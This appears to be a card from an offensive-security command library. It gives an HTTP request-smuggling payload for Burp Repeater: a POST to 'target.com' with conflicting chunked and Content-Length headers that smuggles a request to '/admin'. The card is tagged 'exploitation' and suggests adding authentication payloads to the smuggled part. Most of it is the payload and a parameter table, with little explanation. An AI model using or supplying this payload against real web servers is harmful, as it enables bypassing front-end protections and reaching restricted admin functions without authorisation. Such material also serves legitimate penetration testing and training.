---
data: >-
  In Burp Repeater: POST / HTTP/1.1\nHost: target.com\nTransfer-Encoding:
  chunked\nContent-Length: 4\n\n0\r\n\r\nPOST /admin HTTP/1.1
tags:
  - http-smuggling
  - exploitation
type: command
executor: burp
platforms:
  - Web
id: 4ebf8ee5-97bd-462c-885f-ef7863b9a152
created_at: '2025-12-13T09:01:26.259Z'
updated_at: '2025-12-13T09:01:26.259Z'
verified: false
validated: true
submitted: true
---
# burp-repeater-smuggle

## Command

```bash
# In Burp Repeater: POST / HTTP/1.1\nHost: target.com\nTransfer-Encoding: chunked\nContent-Length: 4\n\n0\r\n\r\nPOST /admin HTTP/1.1
```

## Description

Uses Burp Repeater to craft and send smuggled HTTP requests for testing and exploitation.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `Transfer-Encoding: chunked` | Enables chunked transfer | Yes |
| `Content-Length: 4` | Conflicting length for smuggling | Yes |
| Payload | Smuggled request body | Yes |

## Examples

### Basic Usage

```bash
# Paste into Burp Repeater and send
```

### Advanced Usage

```bash
# Add authentication payloads in smuggled section
```

## Expected Output

Response from backend processing the smuggled request.

## Related
- [[procedures/Craft-and-Send-Smuggled-HTTP-Request]]
- [[tools/Burp-Suite]]
